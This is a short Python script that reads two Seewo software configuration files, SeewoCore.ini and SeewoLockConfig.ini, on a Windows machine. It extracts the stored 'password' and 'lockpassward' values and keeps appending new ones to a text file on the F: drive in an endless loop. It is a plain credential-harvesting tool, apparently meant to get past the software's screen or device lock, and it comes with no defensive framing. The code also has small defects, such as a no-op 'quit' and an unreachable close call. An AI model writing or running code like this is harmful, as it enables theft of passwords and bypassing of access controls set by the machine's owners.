file1 = open(r"C:\ProgramData\Seewo\SeewoCore\SeewoCore.ini",
             "r", encoding="utf-8")
file2 = open(r"C:\Users\seewo\AppData\Roaming\Seewo\SeewoAbility\SeewoLockConfig.ini",
             "r", encoding="utf-8")
save_file = r"F:\cipher.txt"
with open(save_file,"w"):
    quit



def find_cipher(file,save_file):
    save_file = open(save_file, "r")
    saved_cipher = save_file.readlines()
    saved_cipher.append("0")
    file.seek(0)
    content = file.readlines()
    for line in content:
        if line.split("=")[0].lower() == "password" or line.split("=")[0].lower() == "lockpassward":
            for n in saved_cipher:
                if str(n) == line.split("=")[-1]:
                    print(n)
                    print(line.split("=")[-1])
                    return None
                    save_file.close()
            save_file.close()
            return line.split("=")[-1]
    save_file.close()



def save_cipher(cipher, file):
    save_file = open(file, "a")
    save_file.write(cipher)
    save_file.close()



while 1:


    cipher1 = find_cipher(file1,save_file)
    cipher2 = find_cipher(file2,save_file)
    if cipher1 != None:
        save_cipher(cipher1, save_file)
    if cipher2 != None:
        save_cipher(cipher2, save_file)
